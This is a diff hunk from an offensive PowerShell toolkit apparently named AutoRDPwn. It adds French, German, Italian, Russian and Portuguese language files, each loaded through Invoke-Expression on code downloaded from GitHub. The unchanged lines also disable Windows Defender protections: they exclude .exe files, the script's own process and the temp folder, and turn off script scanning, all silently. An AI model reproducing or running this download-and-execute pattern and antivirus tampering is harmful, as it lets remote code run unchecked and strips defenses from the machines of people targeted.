@@ -100,7 +100,12 @@ function Remove-Exclusions {
     if($lang -like '-lang') { $language=$args[3] }
     if($language -in 'English') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Languages/English.ps1') }
     if($language -in 'Spanish') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Languages/Spanish.ps1') }
-
+    if($language -in 'French') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Languages/French.ps1') }
+    if($language -in 'German') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Languages/German.ps1') }
+    if($language -in 'Italian') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Languages/Italian.ps1') }
+    if($language -in 'Russian') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Languages/Russian.ps1') }
+    if($language -in 'Portuguese') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Languages/Portuguese.ps1') }
+    
     $powershell = $host.version ; Write-Host ; if($powershell.major -lt 4) { Write-Host "$txt3" -ForegroundColor 'Red' ; Write-Host
     Write-Host "$txt4" -NoNewLine -ForegroundColor 'Red' ; Write-Host -NoNewLine ; Write-Host " http://aka.ms/wmf5download" -ForegroundColor 'Blue' ; Write-Host ; Start-Sleep -milliseconds 7500 ; exit }
     Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null; Add-MpPreference -ExclusionProcess $pid 2>&1> $null ; Add-MpPreference -ExclusionPath $env:temp 2>&1> $null ; Set-MpPreference -DisableScriptScanning 1 2>&1> $null
